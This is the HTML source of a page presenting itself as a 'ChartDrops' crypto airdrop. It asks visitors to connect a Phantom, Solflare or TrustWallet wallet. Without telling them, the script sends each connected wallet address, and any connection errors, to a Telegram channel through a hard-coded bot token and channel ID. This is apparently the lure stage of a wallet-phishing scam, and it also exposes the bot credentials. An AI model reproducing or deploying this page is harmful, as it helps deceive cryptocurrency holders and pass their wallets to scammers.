<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChartDrops Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
  <style>
    body {
      background: #0d0d0d;
      color: white;
      font-family: sans-serif;
      text-align: center;
      margin-top: 80px;
    }

    .popup {
      background: #1a1a1a;
      padding: 25px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
    }

    button {
      background: #00ffae;
      border: none;
      padding: 12px 20px;
      margin: 10px;
      border-radius: 6px;
      cursor: pointer;
      color: black;
      font-weight: bold;
    }

    button:hover {
      background: #00d69b;
    }

    #connectionStatus {
      margin-top: 20px;
      font-size: 16px;
      color: #00ffae;
    }
  </style>
</head>
<body>
  <div class="popup">
    <h2>ChartDrops Airdrop</h2>
    <p>Connect your wallet to claim</p>
    <button onclick="connectPhantom()">Connect Phantom</button>
    <button onclick="connectSolflare()">Connect Solflare</button>
    <button onclick="connectTrust()">Connect TrustWallet</button>
    <div id="connectionStatus"></div>
  </div>

  <script>
    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
    const CHANNEL_ID = "-1002600871606";

    async function sendTelegramMessage(walletAddress, error = false) {
      const message = error
        ? `❌ Wallet Connect Error on chartdrops.fun:\n${walletAddress}`
        : `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHANNEL_ID,
            text: message
          })
        });
        const result = await res.json();
        console.log("Telegram Response:", result);
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    function updateConnectionStatus(status) {
      const statusElement = document.getElementById('connectionStatus');
      statusElement.textContent = status;
    }

    // Enhanced Phantom connection with mobile support
    async function connectPhantom() {
      // Standard Phantom detection
      if (typeof window.solana !== "undefined" && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
          return;
        } catch (err) {
          console.error("Phantom connect error", err);
          sendTelegramMessage(`Phantom error: ${err.message}`, true);
          updateConnectionStatus("Phantom connection failed.");
          return;
        }
      }

      // Mobile-specific handling without redirect
      if (isMobile()) {
        try {
          // Create a hidden iframe to trigger the wallet app
          const iframe = document.createElement('iframe');
          iframe.src = 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          
          // Show message about how to connect
          updateConnectionStatus("Please check your Phantom app for connection prompt");
          alert("Please check your Phantom app for the connection prompt");
          
          // Remove iframe after a short delay
          setTimeout(() => {
            document.body.removeChild(iframe);
          }, 1000);
          
        } catch (error) {
          console.error("Phantom mobile connection error:", error);
          updateConnectionStatus("Couldn't connect to Phantom");
          alert("Please open Phantom app and try again");
        }
      } else {
        alert("Phantom wallet not detected. Please install Phantom from phantom.app");
        updateConnectionStatus("Phantom wallet not installed");
      }
    }

    // Enhanced Solflare connection with mobile support
    async function connectSolflare() {
      // Standard Solflare detection
      if (typeof window.solflare !== "undefined") {
        try {
          const solflare = window.solflare;
          if (!solflare.isConnected) {
            await solflare.connect();
          }
          const walletAddress = solflare.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
          return;
        } catch (err) {
          console.error("Solflare connect error", err);
          sendTelegramMessage("Solflare error: " + err.message, true);
          updateConnectionStatus("Solflare connection failed.");
          return;
        }
      }

      // Mobile-specific handling without redirect
      if (isMobile()) {
        try {
          // Create a hidden iframe to trigger the wallet app
          const iframe = document.createElement('iframe');
          iframe.src = 'solflare://connect?dapp=' + encodeURIComponent(window.location.href);
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          
          // Show message about how to connect
          updateConnectionStatus("Please check your Solflare app for connection prompt");
          alert("Please check your Solflare app for the connection prompt");
          
          // Remove iframe after a short delay
          setTimeout(() => {
            document.body.removeChild(iframe);
          }, 1000);
          
        } catch (error) {
          console.error("Solflare mobile connection error:", error);
          updateConnectionStatus("Couldn't connect to Solflare");
          alert("Please open Solflare app and try again");
        }
      } else {
        alert("Solflare wallet not detected. Please install Solflare from solflare.com");
        updateConnectionStatus("Solflare wallet not installed");
      }
    }

    // TrustWallet connection
    async function connectTrust() {
      if (window.solana && window.solana.isTrust) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          console.error("TrustWallet connect error", err);
          sendTelegramMessage("TrustWallet error: " + err.message, true);
          updateConnectionStatus("TrustWallet connection failed.");
        }
      } else {
        if (isMobile()) {
          try {
            // Create a hidden iframe to trigger the wallet app
            const iframe = document.createElement('iframe');
            iframe.src = 'trust://connect?dapp=' + encodeURIComponent(window.location.href);
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Show message about how to connect
            updateConnectionStatus("Please check your Trust Wallet app for connection prompt");
            alert("Please check your Trust Wallet app for the connection prompt");
            
            // Remove iframe after a short delay
            setTimeout(() => {
              document.body.removeChild(iframe);
            }, 1000);
            
          } catch (error) {
            console.error("Trust Wallet mobile connection error:", error);
            updateConnectionStatus("Couldn't connect to Trust Wallet");
            alert("Please open Trust Wallet app and try again");
          }
        } else {
          alert("TrustWallet not detected. Please install TrustWallet from trustwallet.com");
          updateConnectionStatus("TrustWallet not installed");
        }
      }
    }

    // Helper function to detect mobile devices
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
  </script>
</body>
</html>
